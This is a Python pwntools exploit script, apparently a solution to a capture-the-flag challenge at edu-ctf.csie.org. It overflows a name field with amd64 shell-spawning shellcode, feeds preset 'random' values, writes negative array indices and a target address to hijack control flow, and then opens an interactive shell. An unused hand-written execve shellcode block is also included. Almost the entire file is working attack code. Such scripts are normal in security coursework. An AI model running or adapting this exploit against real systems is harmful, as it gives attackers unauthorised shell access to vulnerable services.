from pwn import *

r = remote("edu-ctf.csie.org",10172)

arch = context.update(arch='amd64', os='linux')

rand = [83, 86, 77, 15, 93, 35]

payload = """
_start:
push 0x6e69622f
push 0x68732f2f
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall
"""
def name():
	r.recv()
	r.sendline(b"A"*16+p64(0)+b"A"*8+asm(shellcraft.amd64.linux.sh()))

def age():
	r.recv()
	r.sendline(b"20")

def first_try():

	for x in range(6):
		r.recv()
		r.sendline(b"20")

	print(r.recv())
	print(r.sendline("1"))
	print(r.recv())
	r.sendline(b"-42")
	print(r.recv())
	r.sendline(b"0")

def second_try():
	for x in range(len(rand)):
		r.recv()
		r.sendline(str(rand[x]))

	r.recv()
	r.sendline("1")
	r.recv()
	r.sendline("-43")
	r.recv()
	r.sendline("6299920") # 0x602110

if __name__ == "__main__":
	name()
	age()
	first_try()
	second_try()
	r.interactive()
